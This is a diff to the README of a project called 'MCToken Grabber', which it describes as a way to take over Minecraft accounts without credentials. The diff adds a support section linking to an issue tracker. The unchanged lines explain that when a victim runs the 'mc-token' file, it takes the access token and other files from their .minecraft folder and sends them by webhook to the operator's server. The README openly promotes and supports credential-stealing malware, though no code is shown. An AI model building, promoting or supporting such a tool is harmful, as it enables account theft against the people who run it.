@@ -1,6 +1,9 @@
 # MCToken Grabber
 A simple way to gain access to a Minecraft account. No username/email/password needed.
 
+# Having issues?
+- Open an [issue](https://github.com/spinfal/minecraft-token-grabber/issues) with the Error code you're getting (if applicable).
+
 # How does this work?
 - When someone runs the `mc-token` file, it grabs the Access token from their `.minecraft` folder and some other files. It then sends it all over a webhook to your server.
 
